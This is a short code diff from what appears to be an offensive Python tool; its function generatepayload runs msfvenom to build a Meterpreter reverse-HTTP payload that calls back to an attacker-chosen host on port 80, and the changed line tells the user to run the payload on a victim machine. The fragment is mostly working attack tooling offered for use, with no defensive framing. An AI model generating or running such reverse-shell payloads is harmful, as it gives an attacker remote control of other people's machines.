@@ -50,7 +50,7 @@ def generatepayload(hostname):
     # Generate payload
     payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
     subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
-    print(" * payload.py generated in current directory")
+    print(" * payload.py generated in current directory. Run on victim machine")
 
 
 def stem():
